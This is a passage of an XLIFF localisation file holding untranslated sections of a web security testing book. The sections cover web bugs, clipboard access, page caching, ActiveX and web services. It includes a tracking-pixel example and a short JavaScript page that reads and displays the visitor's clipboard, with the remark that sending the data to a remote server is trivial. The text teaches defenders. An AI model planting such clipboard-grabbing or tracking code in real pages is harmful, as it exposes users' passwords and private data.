        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use Web bugs to gather information on a target and you can typically load them from a different source than the visited page. As such, Web bugs have become a replacement for cookies as a user tracking mechanism. And because they are embedded invisibly into an HTML document, Web bugs are much harder to detect. For example, the following Web bug</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;img src="http://ad.doubleclick.net/ad/
 pixel.quicken/NEW" width=1 height=1 border=0&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>was reported to have appeared on Quicken's home page (&lt;a class="docLink" target="_blank" href="http://www.quicken.com"&gt;www.quicken.com&lt;/a&gt;) to provide click information to DoubleClick. Such Web bugs can provide a wealth of information to the advertiser, including the IP address of the client and information about his system and software, including browser version and the time the client views the Web bug image.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web bugs combined with cookies can be powerful information-gathering tools for e-commerce sites. A Web bug can place cookies on machines that visit the bugged site and then track what sites the user visits for the purpose of targeting advertising according to the sites he visits.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There are no reliable techniques for automatically detecting Web bugs because zero-size images are often used for benign page alignment purposes. Thus, a user must resort to reading the HTML source and looking for images with &lt;tt&gt;HEIGHT&lt;/tt&gt; and &lt;tt&gt;WIDTH&lt;/tt&gt; parameters set to 1 (although if an image is natively a single pixel, its size doesn't have to be specified). Turning off cookies is also a legitimate defense for Web bugs that write cookies. The Electronic Frontier Foundation has a good FAQ on Web bugs at &lt;a class="docLink" target="_blank" href="http://www.eff.org/Privacy/Marketing/web_bug.html"&gt;http://www.eff.org/Privacy/Marketing/web_bug.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec7.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Clipboard Access</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Clipboard Access</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>With all the Web sites that require memberships, logins, and more, how many passwords do you have to remember? Four, five, perhaps more? Do you have just one password that you use for everything from your online banking account to your favorite films chat board? Have you ever been tempted to copy your password to the Clipboard so that you don't have to keep typing it?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Alternatively, say you've been working on an important (maybe secret) company document, and you just pop to a Web page to check some facts. You might want to make sure that no parts of that document are in your Clipboard when you visit that site. Otherwise, that secret document may have just leaked.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many people cut, copy, and paste things as they are working. Your membership site e-mailed you a password, and instead of typing it in, you press Ctrl+C to copy it and then Ctrl+V to paste it into place. Or you sign up for membership to a new site and it asks you to type your password twice in order to make sure it is the same both times. So you type it once and then copy it to the next field.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This data that we so casually put into our Clipboard is accessible through Java and can easily be read by a malicious site. The following simple Web page displays what's currently in the Clipboard and displays it on the screen.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;p&amp;gt;Here's what's in your clipboard...&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;

&amp;lt;Script Language="JavaScript"&amp;gt;
var content = clipboardData.getData("Text");
if (content!=null) {
document.write("&amp;lt;center&amp;gt;&amp;lt;font size=5 color=red&amp;gt;TEXT
 RETRIEVED: &amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;");
document.write(content);
}
else {document.write('&amp;lt;p&amp;gt;No text found in
 clipboard.');}
&amp;lt;/Script&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Changing this code so that it sends the information to a remote server is trivial. Beware what is in your Clipboard; someone else might read it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-6. Grabbing clipboard data through JavaScript.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec8.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Caching Pages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Caching Pages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Page caching is a practice designed to reduce user wait times on the Web by saving the responses to common Web requests and storing them for later retrieval. Because the pages do not have to be rebuilt on a rerequest, pages can be delivered much faster. This is obviously a huge benefit when connected over low bandwidth connections. As long as the most recent information is already available, there is no need to retrieve it again.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>So how does the browser know that it has the most recent version of a page? There are two ways. First, when a page is received, the Web server can dictate how long a browser should consider it to be &amp;quot;fresh.&amp;quot; Use it just like a use-by date for food products&amp;mdash;if it's past that date, throw it out and get a new one. Second, the browser can make a simple &lt;tt&gt;HEAD&lt;/tt&gt; request to get the page's current details and compare these with what it already has. In general, Web browsers use both of these approaches.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There is a big issue here with caching pages that contain personal or sensitive data. The browser obviously saves a local copy. If other people can access this local copy (such as a kiosk-type Web access point or a shared computer with insufficient file access controls), then an inquisitive user (or a program, like a virus) could go through the local copies looking for information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-7. Examining the headers for caching information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The most common scenario with Web applications involves one user starting to use the application but actually viewing either information or the output created from previous users. The browser checks to see if it has the most recent version in the cache or sends the &lt;tt&gt;HEAD&lt;/tt&gt; request. Then it gets the same response as it had previously: The page hasn't been modified since it was last requested (because the source of the application hasn't changed, and the timestamp is on the &lt;span class="docEmphasis"&gt;file&lt;/span&gt;, not what was &lt;span class="docEmphasis"&gt;outputted&lt;/span&gt;), and the size and other factors are the same because similar information is being displayed. This could result in different information being displayed than was intended because the Web application didn't actually process the request.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The easiest way of mitigating against this behavior is to add either HTTP headers or HTML metatags to the &amp;quot;head&amp;quot; section of dynamic pages and to those that carry sensitive data. These tags, shown next, tell the browser not to cache the page and to go to the Web server for a fresh copy each time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>HTTP headers cache control &amp;ndash; see
 http://www.w3.org/Protocols/rfc2616/rfc2616-
 sec14.html section 14.9
Cache-Control: max-age=0, must-revalidate
Cache-Control: no-cache
Expires: [set to current data and time]
HTML cache control
&amp;lt;META HTTP-EQUIV="Expires" CONTENT="0"&amp;gt;
&amp;lt;META HTTP-EQUIV="Pragma" CONTENT="no-cache"&amp;gt;
&amp;lt;META HTTP-EQUIV="Cache-Control" CONTENT="no-cache"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec9.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>ActiveX Controls</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec8.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>ActiveX Controls</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>ActiveX is a Microsoft technology that allows multiple programs to share information and file formats. It sprang from OLE (Object Linking and Embedding), which was the mechanism for various Office programs to share data (for example, embedding an Excel spreadsheet into a Word document). After the technology was transitioned to the Web, it was renamed ActiveX (because anything with the letter &lt;span class="docEmphasis"&gt;X&lt;/span&gt; in it just sounds cool).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>ActiveX controls that are downloaded onto a client computer give the Web application more power because ActiveX can use pretty much any API available to normal Windows programs. Obviously, the idea of arbitrary ActiveX controls being installed on a user's machine is a scary proposition. Thus, browsers are programmed to warn of attempts to download these controls and will only do so with the user's permission. In addition, ActiveX controls are now digitally signed as being safe for scripting by their authors, and the browser checks these signatures and verifies that the ActiveX control has not changed since it was registered and that the author is in good standing with the signature authority (which Microsoft has outsourced to VeriSign).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>ActiveX controls are programs that, when downloaded, have access to nearly any file or piece of information stored on the hard drive. The only sure way to protect against malicious controls is to turn ActiveX off in the browser's security settings. Otherwise, you have to ask yourself how much you trust the community's efforts to ensure that only benign ActiveX controls exist within the habitat of the World Wide Web. Digital signatures only prove who wrote the code and that it has not been tampered with. They do not provide assurance of the quality of the code or its lack of malicious elements. In the past, false signatures have been created (slight misspellings of company names) and have been mistakenly issued (&lt;a class="docLink" target="_blank" href="http://news.com.com/2100-1001-254586.html"&gt;http://news.com.com/2100-1001-254586.html&lt;/a&gt;), and additional code (for example, Easter eggs) has slipped through the gaps.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec8.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch10.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 10. Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 10. Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What Are Web Services?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Threats</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch10lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter departs from the &amp;quot;attack&amp;quot; format of previous chapters. Like the privacy material of &lt;a class="docLink" href="ch09.html#ch09"&gt;Chapter 9&lt;/a&gt;, &amp;quot;Privacy,&amp;quot; Web Services are of a more general nature and concern more than just software testers. Web Services are a new type of Web programming paradigm that makes programming Web applications more like programming traditional applications, where programs are purposefully built to be reusable through an exposed application programming interface.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch10lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>According to the Gartner research group, Web Services are the next big thing in the IT industry, slowly taking over from the traditional way that Web applications are developed. With that in mind, this chapter takes a brief look at what Web Services are and what security threats and corresponding countermeasures they represent for Web development projects.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch10lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What Are Web Services?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
